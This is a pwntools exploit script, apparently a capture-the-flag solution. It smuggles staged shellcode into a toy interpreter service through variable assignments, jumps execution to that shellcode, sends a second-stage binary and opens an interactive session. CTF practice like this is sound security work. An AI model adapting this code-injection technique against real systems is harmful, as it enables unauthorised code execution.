from pwn import *

io = remote("localhost", 10000)

def waitprompt():
	io.recvuntil(b'> ')

def assign(var, value):
	waitprompt()
	io.send(var + b'=' + value + b'.')
	io.recvline()

def call_fn(var, arg):
	waitprompt()
	io.send(var + b'(' + arg + b')')

def eval(expr):
	call_fn(b'l', expr)
	io.recvline()
	return int(io.recvline()[:-2], 16)

def load_value(var, value):
	assign(b't', b'0')
	while value > 0:
		rem = value
		if rem > 9:
			rem = 9
		assign(b't', b't+' + bytes([ord('0') + rem]))
		value -= rem
	assign(var, b't')

def bootstrap_code(code):
	while len(code) > 0:
		expected = u16(code[1:3])
		var_chr = bytes([code[0]])
		print(f"Loading {hex(code[0])} ({var_chr}) = {hex(expected)}")
		load_value(var_chr, u16(code[1:3]))
		read_back = eval(var_chr)
		print(hex(read_back))
		assert(read_back == expected)
		code = code[3:]

#putchar = 0x7CAF
l_var = 0x7CDE
jump_var = l_var + 3 # 'a'
addr_var = jump_var + 3
shellcode_loc = addr_var + 3

load_value(b'a', shellcode_loc) # jump_var
load_value(b't', 0) # addr_var

stage1 = open("stage1.bin", 'rb').read()
stage1 = stage1.ljust((len(stage1) + 2)//3 * 3, b'\x00')
print(hexdump(stage1))
bootstrap_code(stage1)
info(f'Running stage1 at {hex(shellcode_loc)}')
call_fn(b'a', b'0')
stage2 = open("stage2.bin", 'rb').read()
print(hexdump(stage2))
stage2 = stage2.ljust(0x4100, b'\x00')
assert(not b' ' in stage2)
info(f'Running stage2')
io.send(stage2)
io.interactive()
io.recvuntil(b'kalmar')
io.unrecv(b'kalmar')
while True:
	print(io.recv())
